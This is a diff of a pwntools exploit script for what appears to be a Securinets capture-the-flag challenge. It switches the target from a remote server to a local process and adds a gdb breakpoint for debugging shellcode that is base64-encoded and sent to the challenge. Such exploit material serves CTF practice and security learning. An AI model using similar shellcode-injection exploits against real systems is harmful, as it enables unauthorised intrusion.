@@ -1,7 +1,7 @@
 from pwn import *
 from base64 import b64encode
-#p=process("python3 main.py".split(" "))
-p=remote("localhost",1301)
+p=process("python3 main.py".split(" "))
+#p=remote("pwn-14caf623.p1.securinets.tn",9001)
 context.arch="amd64"
 
 #p.send(p16(0))
@@ -18,6 +18,11 @@ shellcode+='''
         push rbx
         pop rdx
         '''
+
+shellcode+="int3\n"  # remote 
+gdb.attach(p,"c")
+
+
 #shellcode+="pop rbx\n"*(0x448//8) # local
 shellcode+="pop rbx\n"*(0x210//8)
 shellcode+="pop rdx\n"  ## this goes in rdx for read later
@@ -50,7 +55,6 @@ shellcode+="push rcx\n"
 shellcode+="pop rbx\n"*(2)
 print(len(asm(shellcode)))
 
-#gdb.attach(p,"c")
 pause()
 p.sendline(b64encode(asm(shellcode)))
 
